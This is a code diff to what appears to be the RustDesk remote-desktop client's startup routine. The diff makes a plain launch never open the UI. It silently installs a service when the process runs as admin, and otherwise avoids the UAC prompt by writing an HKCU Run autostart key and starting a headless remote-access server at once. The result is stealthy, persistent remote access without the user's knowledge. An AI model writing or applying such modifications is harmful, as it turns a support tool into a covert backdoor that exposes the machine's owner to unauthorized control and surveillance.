@@ -212,13 +212,28 @@ pub fn core_main() -> Option<CoreMainAction> {
             hbb_common::config::PeerConfig::preload_peers();
         }
         // Modified: plain launch (no args) must NEVER open the UI —
-        // first run on Windows: trigger the silent installer once (UAC), then exit;
-        // after install (or on Linux): run the headless server in this process.
+        // first run on Windows: if the process is already elevated, install the
+        // service silently with no UAC prompt; if not elevated, do NOT trigger
+        // UAC at all — register a per-user autostart (HKCU Run) and run the
+        // headless server as the current user. After install (or on Linux):
+        // run the headless server in this process.
         #[cfg(any(target_os = "windows", target_os = "linux"))]
         if args.is_empty() {
             #[cfg(target_os = "windows")]
             if !crate::platform::is_installed() {
-                let _ = crate::platform::elevate("--silent-install");
+                if crate::platform::is_elevated(None).unwrap_or(false) {
+                    // Already admin: silent install + service, no UAC prompt.
+                    if crate::platform::install_me("", "".to_owned(), true, false).is_ok() {
+                        crate::platform::remove_autostart_run_key();
+                        crate::platform::install_service(); // exits the process on success
+                        return None;
+                    }
+                    return None;
+                }
+                // No admin rights: skip UAC entirely — per-user autostart
+                // (HKCU Run, launches "--server" headless at logon) + run now.
+                hbb_common::allow_err!(crate::platform::set_autostart_run_key());
+                crate::start_server(true, false);
                 return None;
             }
             crate::start_server(true, false);
